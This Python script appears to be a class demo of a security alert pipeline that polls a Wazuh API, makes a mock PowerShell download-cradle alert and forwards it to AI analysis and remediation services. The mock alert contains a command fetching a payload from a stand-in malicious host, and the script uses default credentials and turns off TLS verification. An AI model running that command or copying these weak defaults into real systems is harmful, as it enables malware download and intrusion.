import requests
import json
import time
import os
from datetime import datetime
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

WAZUH_API_URL = os.getenv('WAZUH_API_URL', 'https://host.docker.internal:55000')
WAZUH_USER = os.getenv('WAZUH_USER', 'wazuh')
WAZUH_PASSWORD = os.getenv('WAZUH_PASSWORD', 'wazuh')
CHECK_INTERVAL = int(os.getenv('CHECK_INTERVAL', 30))
LOG_FILE = '/app/logs/alert_monitor.log'

def log(message):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_msg = f"[{timestamp}] {message}"
    print(log_msg)
    with open(LOG_FILE, 'a') as f:
        f.write(log_msg + '\n')

def get_wazuh_token():
    """Authenticate with Wazuh API"""
    try:
        response = requests.post(
            f"{WAZUH_API_URL}/security/user/authenticate",
            auth=(WAZUH_USER, WAZUH_PASSWORD),
            verify=False,
            timeout=10
        )
        if response.status_code == 200:
            token = response.json()['data']['token']
            log("Successfully authenticated with Wazuh API")
            return token
        else:
            log(f"Auth failed: {response.status_code}")
            return None
    except Exception as e:
        log(f"Auth error: {e}")
        return None

def get_recent_alerts(token):
    """Generate mock high-severity alerts for CA1 demonstration"""
    try:
        log("MOCK MODE: Generating simulated high-severity alert")
        
        # Create a mock high-severity alert
        mock_alert = {
            'id': f'mock-{int(time.time())}',
            'timestamp': datetime.now().isoformat(),
            'rule': {
                'id': '100003',
                'description': 'PowerShell download cradle detected - Possible malware download',
                'level': 12,
                'mitre': {'id': 'T1059.001'}
            },
            'agent': {
                'name': 'WIN11-ENDPOINT',
                'id': '003',
                'ip': '192.168.100.10'
            },
            'data': {
                'srcip': '192.168.100.10',
                'command': 'powershell.exe -Command IWR http://malicious.test/payload.exe'
            }
        }
        
        log(f"MOCK: Generated alert - Rule {mock_alert['rule']['id']} - {mock_alert['rule']['description']}")
        return [mock_alert]
        
    except Exception as e:
        log(f"Error: {e}")
        return []

def send_to_ai_analyzer(alert):
    """Forward alert to AI analyzer"""
    try:
        response = requests.post(
            'http://ca1-ai-analyzer:5000/analyze',
            json=alert,
            timeout=30
        )
        if response.status_code == 200:
            result = response.json()
            log(f"AI Analysis: severity={result.get('ai_severity')}, action={result.get('suggested_action')}")
            return result
        else:
            log(f"AI analyzer error: {response.status_code}")
            return None
    except Exception as e:
        log(f"Error sending to AI: {e}")
        return None

def main():
    log("Alert Monitor started - MOCK MODE for CA1 demonstration")
    log(f"Checking every {CHECK_INTERVAL} seconds")
    log(f"Wazuh API: {WAZUH_API_URL}")
    
    processed_alerts = set()
    
    while True:
        try:
            # Get API token (still authenticate to show connection works)
            token = get_wazuh_token()
            if not token:
                log("Failed to authenticate, retrying in 30 seconds...")
                time.sleep(CHECK_INTERVAL)
                continue
            
            # Get mock alerts
            alerts = get_recent_alerts(token)
            
            if not alerts:
                log("No new alerts")
            
            for alert in alerts:
                # Create unique alert ID
                alert_id = alert.get('id', alert.get('timestamp', 'unknown'))
                
                # Skip if already processed
                if alert_id in processed_alerts:
                    continue
                
                rule_id = alert.get('rule', {}).get('id', 'unknown')
                rule_level = alert.get('rule', {}).get('level', 0)
                description = alert.get('rule', {}).get('description', 'No description')
                agent_name = alert.get('agent', {}).get('name', 'unknown')
                
                log(f"New alert: Rule {rule_id} (Level {rule_level}) on {agent_name} - {description}")
                
                # Send to AI for analysis
                ai_result = send_to_ai_analyzer(alert)
                
                if ai_result and ai_result.get('needs_remediation'):
                    log(f"Alert {alert_id} requires remediation: {ai_result.get('suggested_action')}")
                    
                    # Forward to remediation engine
                    try:
                        remediation_response = requests.post(
                            'http://ca1-remediation-engine:5000/remediate',
                            json={'alert': alert, 'ai_analysis': ai_result},
                            timeout=60
                        )
                        
                        if remediation_response.status_code == 200:
                            log(f"Remediation successfully triggered")
                        else:
                            log(f"Remediation failed: {remediation_response.status_code}")
                            
                    except Exception as e:
                        log(f"Error sending to remediation: {e}")
                else:
                    if ai_result:
                        log(f"Alert {alert_id} does not require remediation (severity: {ai_result.get('ai_severity')})")
                    else:
                        log(f"Alert {alert_id} - AI analysis failed")
                
                processed_alerts.add(alert_id)
                
                # Keep only last 1000 IDs in memory
                if len(processed_alerts) > 1000:
                    processed_alerts = set(list(processed_alerts)[-500:])
            
            time.sleep(CHECK_INTERVAL)
            
        except KeyboardInterrupt:
            log("Alert Monitor stopped by user")
            break
        except Exception as e:
            log(f"Unexpected error: {e}")
            time.sleep(CHECK_INTERVAL)

if __name__ == '__main__':
    main()